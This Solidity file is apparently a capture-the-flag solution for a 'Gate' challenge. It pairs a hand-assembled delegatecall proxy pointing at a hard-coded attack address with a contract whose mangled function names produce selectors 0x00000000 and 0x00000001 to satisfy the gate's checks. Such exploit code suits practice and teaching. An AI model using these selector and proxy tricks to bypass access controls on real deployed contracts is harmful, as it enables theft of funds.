// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "hardhat/console.sol";



contract GateQuillAttackProxy {
    
    constructor() {
        // assembly {
        //     let selector := shr(224, calldataload(0x0))  // function signature
        //     switch selector
        //     // cast sig "" 
        //     case f00000000_bvvvdlt {  // 0x00000000
        //         mstore(0x0, caller)
        //         return(0x0, 0x20)
        //     }
        //     case f00000001_grffjzz {  // 0x00000001
        //         mstore(0x0, origin)
        //         return(0x0, 0x20)
        //     }
        //     case fail {               // 0xa9cc4718
        //         revert(0x0, 0x20)
        //     }
        // }
        // 
        assembly {
            sstore(0x0, 0x7b948C80DFAdf4CC547758704932d059A2274919)  // attack address
            mstore(0x0, 0x363d3d373d3d3d363d3d545af43d82803e903d91601857fd5bf3000000000000)
            return(0x0, 0x1a)
        }
    }
}

contract GateQuillAttack {
    
    function f00000000_bvvvdlt() external view returns(address) {
        return msg.sender;
    }

    function f00000001_grffjzz() external view returns(address) {
        return tx.origin;
    }

    function fail() external pure {
        assembly {
            revert(0x0, 0x0)
        }
    }
}


